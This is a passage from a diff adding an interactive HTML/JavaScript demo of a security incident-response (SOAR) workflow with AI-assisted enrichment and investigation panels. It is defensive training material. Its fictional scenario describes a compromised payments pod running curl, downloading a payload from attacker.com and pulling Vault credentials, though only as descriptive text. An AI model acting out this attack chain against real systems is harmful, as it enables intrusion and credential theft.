+  aiNarrative: "The payment-api-prod workload belonging to the Payments team was deployed approximately 2 hours ago into the production cluster. The workload established an outbound connection to attacker.com, a destination currently classified as known malware infrastructure. This communication represents the first observed external connection from this workload and may indicate workload compromise.",
+  confidence: 92,
+  productionAsset: true,
+  threatLevel: "High"
+};
+
+const AI_INVESTIGATION = {
+  flowSources: ["Kubernetes", "Runtime Security", "Threat Intelligence", "GitHub", "CI/CD", "Vault", "Database"],
+  timeline: [
+    { time: "09:01", text: "Initial Exploit" },
+    { time: "09:02", text: "Shell Execution" },
+    { time: "09:03", text: "Payload Download" },
+    { time: "09:05", text: "Secret Retrieval" },
+    { time: "09:06", text: "Database Query" },
+    { time: "09:07", text: "External Communication" }
+  ],
+  findings: [
+    "Java application spawned shell",
+    "Shell executed curl command",
+    "Payload downloaded from attacker.com",
+    "Destination identified as known malware command-and-control infrastructure",
+    "Database credentials retrieved from Vault",
+    "Customer records queried"
+  ],
+  hypothesis: "Evidence suggests successful remote code execution through the payment API workload followed by credential access and potential data exfiltration.",
+  hypothesisConfidence: 91,
+  recommendedActions: [
+    "Quarantine workload",
+    "Revoke workload credentials",
+    "Preserve forensic evidence",
+    "Review customer data exposure"
+  ],
+  compare: {
+    manualTime: "2 Hours",
+    aiTime: "10 Minutes",
+    sourcesReviewed: 8,
+    correlatedFindings: 12
+  }
+};
+
+const els = {
+  flowTrack: document.getElementById("flowTrack"),
+  detailsPanel: document.getElementById("detailsPanel"),
+  timeline: document.getElementById("timeline"),
+  severityBadge: document.getElementById("severityBadge"),
+  severityText: document.getElementById("severityText"),
+  riskFill: document.getElementById("riskFill"),
+  riskValue: document.getElementById("riskValue"),
+  summaryCard: document.getElementById("summaryCard"),
+  summaryResponse: document.getElementById("summaryResponse"),
+  autoResponse: document.getElementById("autoResponse"),
+  btnPlay: document.getElementById("btnPlay"),
+  btnReset: document.getElementById("btnReset")
+};
+
+function sevClass(sev) {
+  return "sev-" + sev.toLowerCase();
+}
+
+function renderFlow() {
+  els.flowTrack.innerHTML = "";
+  WORKFLOW_STEPS.forEach((step, i) => {
+    if (i > 0) {
+      const arrow = document.createElement("div");
+      arrow.className = "flow-arrow";
+      arrow.textContent = "→";
+      els.flowTrack.appendChild(arrow);
+    }
+    const el = document.createElement("div");
+    el.className = "flow-step cat-" + step.category;
+    el.dataset.id = step.id;
+    el.innerHTML =
+      '<div class="step-num">' + step.id + "</div>" +
+      '<div class="step-body">' +
+      '<div class="step-title">' + step.title + "</div>" +
+      '<div class="step-cat">' + step.categoryLabel + " · " + step.severity + "</div>" +
+      "</div>";
+    el.addEventListener("click", () => selectStep(step.id, false));
+    els.flowTrack.appendChild(el);
+  });
+}
+
+function renderTimeline() {
+  els.timeline.innerHTML = "";
+  TIMELINE.forEach((ev, i) => {
+    const el = document.createElement("div");
+    el.className = "tl-item";
+    el.dataset.index = i;
+    el.innerHTML = '<div class="tl-time">' + ev.time + '</div><div class="tl-text">' + ev.text + '</div>';
+    els.timeline.appendChild(el);
+  });
+}
+
+function listHtml(items) {
+  return "<ul>" + items.map((x) => "<li>" + x + "</li>").join("") + "</ul>";
+}
+
+function getStepResponseContent(step) {
+  const auto = els.autoResponse.checked;
+  if (step.id !== 9) {
+    return {
+      actions: step.actions || [],
+      outputs: step.outputs || [],
+      example: step.example || ""
+    };
+  }
+  return {
+    actions: auto ? step.actionsAuto : step.actionsManual,
+    outputs: auto ? step.outputsAuto : step.outputsManual,
+    example: auto ? step.exampleAuto : step.exampleManual
+  };
+}
+
+function renderAiEnrichmentSection() {
+  const d = AI_ENRICHMENT.traditional;
+  return (
+    '<div class="ai-expand open" id="aiExpand6">' +
+    '<button type="button" class="ai-expand-toggle" data-expand="aiExpand6">' +
+    '<span>AI-Assisted Enrichment</span>' +
+    '<span><span class="ai-badge">✦ AI Context Builder</span> <span class="chev">▼</span></span>' +
+    '</button>' +
+    '<div class="ai-expand-body">' +
+    '<div class="ai-copilot-grid">' +
+    '<div class="ai-card">' +
+    '<h4>Traditional SOAR Enrichment</h4>' +
+    '<div class="ai-kv"><span>Pod Name</span><br><strong>' + d.pod + '</strong></div>' +
+    '<div class="ai-kv"><span>Namespace</span><br><strong>' + d.namespace + '</strong></div>' +
+    '<div class="ai-kv"><span>Cluster</span><br><strong>' + d.cluster + '</strong></div>' +
+    '<div class="ai-kv"><span>Service Account</span><br><strong>' + d.serviceAccount + '</strong></div>' +
+    '<div class="ai-kv"><span>Source IP</span><br><strong>' + d.sourceIp + '</strong></div>' +
+    '<div class="ai-kv"><span>Destination IP</span><br><strong>' + d.destIp + ' (attacker.com)</strong></div>' +
+    '<div class="ai-kv"><span>Image Digest</span><br><strong>' + d.imageDigest + '</strong></div>' +
+    '<div class="ai-kv"><span>Deployment</span><br><strong>' + d.deployedAt + '</strong></div>' +
+    '<div class="ai-kv"><span>Repository</span><br><strong>' + d.repository + '</strong></div>' +
+    '<div class="ai-kv"><span>Owner Team</span><br><strong>' + d.owner + '</strong></div>' +
+    '</div>' +
+    '<div class="ai-card ai-card--ai">' +
+    '<h4>AI Context Builder <span class="ai-badge">✦ AI Context Builder</span></h4>' +
+    '<p class="ai-narrative">' + AI_ENRICHMENT.aiNarrative + '</p>' +
+    '<div class="ai-metrics">' +
+    '<div class="ai-metric confidence"><span>AI Confidence</span><strong>' + AI_ENRICHMENT.confidence + '%</strong></div>' +
+    '<div class="ai-metric prod"><span>Production Asset</span><strong>' + (AI_ENRICHMENT.productionAsset ? "Yes" : "No") + '</strong></div>' +
+    '<div class="ai-metric threat"><span>Threat Level</span><strong>' + AI_ENRICHMENT.threatLevel + '</strong></div>' +
+    '</div></div></div>' +
+    '<p style="margin-top:.65rem;font-size:.78rem;"><a href="supply-chain-provenance-soar.html" style="color:var(--orange);font-weight:600;">→ Supply chain provenance deep dive</a> — correlate runtime digest to signed build artifact and SBOM.</p>' +
+    '</div></div>'
+  );
+}
+
+function renderAiInvestigationSection() {
+  const inv = AI_INVESTIGATION;
+  const sources = inv.flowSources.map(function (s) {
+    return '<span class="inv-node source">' + s + '</span>';
+  }).join("");
+  const tlItems = inv.timeline.map(function (ev, i) {
+    return '<div class="inv-tl-item" data-inv-idx="' + i + '">' +
+      '<div class="inv-tl-time">' + ev.time + '</div>' +
+      '<div class="inv-tl-text">' + ev.text + '</div></div>';
+  }).join("");
+  const findings = inv.findings.map(function (f) {
+    return '<div class="ai-finding"><span class="check">✓</span><span>' + f + '</span></div>';
+  }).join("");
+  const actions = inv.recommendedActions.map(function (a, i) {
+    return "<li>" + a + "</li>";
+  }).join("");
+
+  return (
+    '<div class="ai-expand open" id="aiExpand7">' +
+    '<button type="button" class="ai-expand-toggle" data-expand="aiExpand7">' +
+    '<span>AI Investigation Copilot</span>' +
+    '<span><span class="ai-badge">✦ AI Investigation Agent</span> <span class="chev">▼</span></span>' +
+    '</button>' +
+    '<div class="ai-expand-body">' +
+    '<div class="inv-flow">' +
+    '<div class="inv-node alert">Alert</div><div class="inv-arrow">↓</div>' +
+    '<div class="inv-node agent">AI Investigation Agent</div><div class="inv-arrow">↓</div>' +
+    '<div class="inv-flow-row">' + sources + '</div><div class="inv-arrow">↓</div>' +
+    '<div class="inv-node stage">Evidence Correlation</div><div class="inv-arrow">↓</div>' +
+    '<div class="inv-node stage">Findings</div></div>' +
+    '<div class="ai-card"><h4>Investigation Timeline</h4><div class="inv-timeline" id="invTimeline">' + tlItems + '</div></div>' +
+    '<div class="ai-copilot-grid" style="margin-top:.75rem">' +
+    '<div class="ai-card ai-card--ai"><h4>AI Findings</h4>' + findings + '</div>' +
+    '<div class="ai-card"><h4>Root Cause Hypothesis</h4>' +
+    '<div class="ai-hypothesis">' + inv.hypothesis +
+    '<div class="conf">Confidence: ' + inv.hypothesisConfidence + '%</div></div>' +
+    '<h4 style="margin-top:.65rem;font-size:.72rem;text-transform:uppercase;color:var(--muted)">Recommended Actions</h4>' +
+    '<div class="ai-actions"><ol>' + actions + '</ol></div></div></div>' +
+    '<div class="ai-card" style="margin-top:.75rem"><h4>Investigation Summary — Traditional vs AI-Assisted</h4>' +
+    '<div class="ai-compare">' +
+    '<div class="ai-compare-col"><h5>Traditional Investigation</h5>' +
+    '<div class="ai-stat">Manual investigation time: <strong>' + inv.compare.manualTime + '</strong></div></div>' +
+    '<div class="ai-compare-col ai"><h5>AI-Assisted Investigation</h5>' +
+    '<div class="ai-stat">Investigation time: <strong>' + inv.compare.aiTime + '</strong></div>' +
+    '<div class="ai-stat">Evidence sources reviewed: <strong>' + inv.compare.sourcesReviewed + '</strong></div>' +
+    '<div class="ai-stat">Correlated findings: <strong>' + inv.compare.correlatedFindings + '</strong></div></div></div></div>' +
+    '<div class="ai-banner">AI accelerates enrichment and investigation by synthesizing evidence across multiple systems. Analysts remain responsible for final response decisions.</div>' +
+    '<p style="margin-top:.65rem;font-size:.78rem;"><a href="supply-chain-provenance-soar.html" style="color:var(--orange);font-weight:600;">→ Supply chain provenance deep dive</a> — connect runtime workload to build artifact, SBOM, and signed provenance.</p>' +
+    '</div></div>'
+  );
+}
+
+function bindExpandToggles() {
+  els.detailsPanel.querySelectorAll(".ai-expand-toggle").forEach(function (btn) {
+    btn.addEventListener("click", function () {
+      var id = btn.getAttribute("data-expand");
+      var box = document.getElementById(id);
+      if (box) box.classList.toggle("open");
+    });
+  });
+}
+
+function clearCopilotAnim() {
+  if (copilotAnimTimer) {
+    clearInterval(copilotAnimTimer);
+    copilotAnimTimer = null;
+  }
+}
+
+function animateInvestigationTimeline() {
+  clearCopilotAnim();
+  var items = els.detailsPanel.querySelectorAll(".inv-tl-item");
+  if (!items.length) return;
+  items.forEach(function (el) { el.classList.remove("visible"); });
+  var idx = 0;
+  copilotAnimTimer = setInterval(function () {
+    if (idx < items.length) {
+      items[idx].classList.add("visible");
+      idx++;
+    } else {
+      clearCopilotAnim();
+    }
+  }, 450);
+}
+
+function initCopilotForStep(stepId) {
+  bindExpandToggles();
+  if (stepId === 7) {
+    setTimeout(animateInvestigationTimeline, 200);
+  }
+}
+
+function renderDetails(step) {
+  clearCopilotAnim();
+  const resp = getStepResponseContent(step);
+  const actions = resp.actions;
+  const outputs = Array.isArray(resp.outputs) ? resp.outputs : [resp.outputs];
+
+  let autoNote = "";
+  if (step.id === 9) {
+    autoNote = els.autoResponse.checked
+      ? '<p style="margin-bottom:.5rem;font-size:.82rem;color:#fca5a5;">⚡ Auto Response Mode ON — containment executes without analyst approval</p>'
+      : '<p style="margin-bottom:.5rem;font-size:.82rem;color:#fbbf24;">👤 Auto Response Mode OFF — analyst approval required before containment</p>';
+  }
+
+  let copilotHtml = "";
+  if (step.id === 6) copilotHtml = renderAiEnrichmentSection();
+  if (step.id === 7) copilotHtml = renderAiInvestigationSection();
+
+  els.detailsPanel.classList.toggle("details-panel--copilot", step.id === 6 || step.id === 7);
+
+  els.detailsPanel.innerHTML =
+    "<h2>" + step.title + "</h2>" +
+    '<p class="meta">Step ' + step.id + " · " + step.categoryLabel + " · " + step.severity + " · Risk " + step.riskScore + "</p>" +
+    autoNote +
+    '<div class="detail-section"><h3>Purpose</h3><p>' + step.purpose + "</p></div>" +
+    '<div class="detail-section"><h3>Inputs</h3>' + listHtml(step.inputs) + "</div>" +
+    '<div class="detail-section"><h3>Actions performed</h3>' + listHtml(actions) + "</div>" +
+    '<div class="detail-section"><h3>Outputs</h3>' + listHtml(outputs) + "</div>" +
+    '<div class="detail-section"><h3>Example data</h3><pre>' + resp.example + "</pre></div>" +
+    '<div class="detail-section"><h3>Tool examples</h3><div class="tool-tags">' +
+    (step.tools || []).map((t) => '<span class="tool-tag">' + t + "</span>").join("") +
+    "</div></div>" +
+    copilotHtml;
+
+  if (step.id === 6 || step.id === 7) initCopilotForStep(step.id);
+}
+
+function updateStatus(step) {
+  els.severityBadge.className = "badge " + sevClass(step.severity);
+  els.severityText.textContent = "Severity: " + step.severity;
+  els.riskFill.style.width = step.riskScore + "%";
+  els.riskValue.textContent = step.riskScore;
+}
+
+function highlightTimeline(stepIndex) {
+  document.querySelectorAll(".tl-item").forEach((el, i) => {
+    el.classList.toggle("active", i <= Math.min(stepIndex, TIMELINE.length - 1));
+  });
+}
+
+function selectStep(id, fromPlay) {
+  const step = WORKFLOW_STEPS.find((s) => s.id === id);
+  if (!step) return;
+  activeStep = id;
+
+  document.querySelectorAll(".flow-step").forEach((el) => {
+    const sid = Number(el.dataset.id);
+    el.classList.toggle("active", sid === id);
+    el.classList.toggle("playing", fromPlay && sid === id);
+    if (sid === id) {
+      el.scrollIntoView({ behavior: "smooth", block: "nearest", inline: "center" });
+    }
+  });
+
+  renderDetails(step);
+  updateStatus(step);
+  highlightTimeline(id - 1);
+
+  if (id === WORKFLOW_STEPS.length) {
+    showSummary();
+  } else {
+    els.summaryCard.classList.remove("visible");
+  }
+}
+
+function showSummary() {
+  const auto = els.autoResponse.checked;
+  const responses = auto
+    ? [
+        "Egress to attacker.com blocked",
+        "Pod payment-api-prod quarantined",
+        "Workload credentials revoked",
+        "Evidence package preserved",
+        "P1 incident INC-004521 created",
+        "Remediation tasks opened"
+      ]
+    : [
+        "Analyst approved containment actions",
+        "Egress blocked after approval",
+        "Pod quarantined after approval",
+        "Evidence package preserved",
+        "P1 incident INC-004521 created",
+        "Remediation tasks opened"
+      ];
+  els.summaryResponse.innerHTML = responses.map((r) => "<li>" + r + "</li>").join("");
+  els.summaryCard.classList.add("visible");
+  els.summaryCard.scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+function stopPlay() {
+  playing = false;
+  clearInterval(playTimer);
+  playTimer = null;
+  els.btnPlay.textContent = "▶ Play Flow";
+  document.querySelectorAll(".flow-step").forEach((el) => el.classList.remove("playing"));
+}
+
+function playFlow() {
+  if (playing) {
+    stopPlay();
+    return;
+  }
+  stopPlay();
+  reset(false);
+  playing = true;
+  els.btnPlay.textContent = "⏸ Pause";
+  let i = 0;
+  selectStep(WORKFLOW_STEPS[0].id, true);
+  playTimer = setInterval(() => {
+    i++;
+    if (i >= WORKFLOW_STEPS.length) {
+      selectStep(WORKFLOW_STEPS[WORKFLOW_STEPS.length - 1].id, true);
+      stopPlay();
+      return;
+    }
+    selectStep(WORKFLOW_STEPS[i].id, true);
+  }, 1000);
+}
+
+function reset(clearSummary) {
+  stopPlay();
+  clearCopilotAnim();
+  activeStep = null;
+  document.querySelectorAll(".flow-step").forEach((el) => {
+    el.classList.remove("active", "playing");
+  });
+  highlightTimeline(-1);
+  els.severityBadge.className = "badge sev-low";
+  els.severityText.textContent = "Severity: Low";
+  els.riskFill.style.width = "0%";
+  els.riskValue.textContent = "0";
+  if (clearSummary !== false) els.summaryCard.classList.remove("visible");
+  els.detailsPanel.classList.remove("details-panel--copilot");
+  els.detailsPanel.innerHTML =
+    "<h2>Select a step</h2>" +
+    '<p class="meta">Click a workflow step or press Play Flow to explore the incident lifecycle.</p>';
+}
+
+els.btnPlay.addEventListener("click", playFlow);
+els.btnReset.addEventListener("click", () => reset(true));
+els.autoResponse.addEventListener("change", () => {
+  if (activeStep === 9) selectStep(9, false);
+  if (activeStep === 13) showSummary();
+});
+
+renderFlow();
+renderTimeline();
+reset(true);
+</script>
+</body>
+</html>
